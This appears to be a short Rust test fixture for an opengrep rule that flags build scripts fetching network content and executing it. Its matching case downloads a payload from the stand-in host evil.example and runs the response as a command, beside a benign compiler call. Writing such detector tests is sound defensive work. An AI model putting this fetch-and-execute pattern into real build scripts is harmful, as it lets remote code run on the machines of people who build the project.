// opengrep --test fixtures for buildrs_net_to_exec.
// Lines tagged `ruleid:` MUST match; `ok:` MUST NOT.
use std::process::Command;

fn main() {
    let body = reqwest::blocking::get("http://evil.example/payload")
        .unwrap()
        .text()
        .unwrap();
    // ruleid: buildrs_net_to_exec
    Command::new(body).output().unwrap();

    // ok: buildrs_net_to_exec
    Command::new("cc").arg("shim.c").output().unwrap();
}
